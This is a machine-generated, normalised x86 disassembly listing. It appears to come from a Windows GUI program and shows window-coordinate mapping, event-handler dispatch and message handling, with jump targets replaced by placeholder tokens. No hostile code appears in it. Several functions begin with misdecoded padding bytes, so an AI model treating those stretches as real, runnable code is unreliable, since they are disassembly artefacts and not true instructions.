mov eax [ ebp - 0x4 ]
call sub_42c918
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42c94c
mov ecx eax
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x28 ]
call sub_43b800
lea esi [ ebp - 0x40 ]
lea edi [ ebp - 0x28 ]
mov ecx 0x4
[ edi ] [ esi ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42dbe8
mov [ ebp - 0xd ] al
jmp r-xdata
lea ecx [ ebp - 0x30 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_42c3a8
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
cmp [ eax + 0x148 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov bx 0xffc2
call sub_44c24c
test al al
jne r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x148 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
push 0x2
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_434714
push eax
call MapWindowPoints
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429894
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42dbd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_434714
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x14 ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0x14 ]
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x28 ]
mov ecx 0x4
[ edi ] [ esi ]
push 0x1
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_434714
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov bx 0xffbb
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_44c070
retn
push 0x2
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
call MapWindowPoints
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42c198
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub_42dbe8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x1c ]
mov ecx 0x4
[ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov al 0x1
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov bx 0xffc2
call sub_44c24c
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_42ed64
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov bx 0xffd1
call sub_44c24c
mov eax [ ebp - 0xc ]
call sub_42c2b0
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
call sub_42c25c
mov ecx eax
xor edx edx
xor eax eax
call sub_43b7c8
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov bx 0xffd1
call sub_44c24c
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub_42dc9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0xffef
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42dcd8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xaa ] 0x0
je r-xdata
mov al [ ebp - 0xd ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_42dd20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x5
je r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov [ ebp - 0xd ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax ] edx
add al 0xfd
sub al 0x2
jae r-xdata
mov al [ ebp - 0xd ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
sub al 0x3
jae r-xdata
sub_42dd94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov al [ ebp - 0xd ]
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42de1c
sub_42ddd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_42de1c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0xc ] 0x0
jbe r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
cmp [ ebp - 0x1c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x1c ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov [ eax ] edx
sub_42df28
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x20 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_42df74
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x98 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x94 ] eax
pop ecx
pop ebp
retn
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov al [ eax + 0x4b ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov al [ eax + 0x4b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_42e014
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_42bdc0
pop ecx
pop ecx
pop ebp
retn
sub_42e074
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x100
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x200
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x108
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x238 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x20a
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x238 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_42c468
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0x200
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_425bfc
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
sub [ eax ] 0x2
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x44 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffee
call sub_44c24c
jmp r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_42e1e4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_446a2c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
call sub_446a6c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_42c468
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x54 ] 0x0
je r-xdata
dec eax
je r-xdata
mov eax r-xdata
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x54 ] 0x0
jne r-xdata
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
dec ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_446860
call sub_4467d0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
call sub_4467d0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
sub_42e2a9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_4400d4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4e ] al
pop ecx
pop ecx
pop ebp
retn
sub_42e2d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x4e ]
mov eax [ ebp - 0x8 ]
call sub_441f84
pop ecx
pop ecx
pop ebp
retn
sub_42e2f0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x4e ]
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov al [ eax + 0x4e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x4e ]
setne [ ebp - 0x1 ]
jmp r-xdata
mov al [ ebp - 0x1 ]
pop ecx
pop ebp
retn
sub_42e330
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_42e2d0
push ebp
call sub_42e2f0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42e37e
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b988
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b988
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x108 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ eax ]
call [ edx + 0x18 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
sub_42e410
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_42e43c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_42e484
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x10
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0xa ]
push eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
call sub_41a61c
mov ecx eax
or cl [ ebp + 0x8 ]
mov dl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffda
call sub_44c24c
sub_42e4d4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_42c420
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x8
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42cdb8
mov al [ r-xdata ]
push eax
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_42e484
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x44 ] 0x2
sub_42e538
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_42c420
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_42e560
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_42c420
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x8
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42cdb8
mov al [ r-xdata ]
push eax
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_42e484
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffeb
call sub_44c24c
sub_42e5c5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42e5e4
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42dd94
test al al
je r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov al 0x1
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_42dd20
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ eax ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_42dd94
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
sub_42e688
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx [ ebp - 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
call sub_42e484
pop ecx
pop ecx
pop ebp
retn
sub_42e6b9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx [ ebp - 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
call sub_42e484
pop ecx
pop ecx
pop ebp
retn
sub_42e6ea
add [ eax ] al
inc eax
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx [ ebp - 0x8 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
call sub_42e484
pop ecx
pop ecx
pop ebp
retn
sub_42e721
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx [ ebp - 0x8 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
call sub_42e484
pop ecx
pop ecx
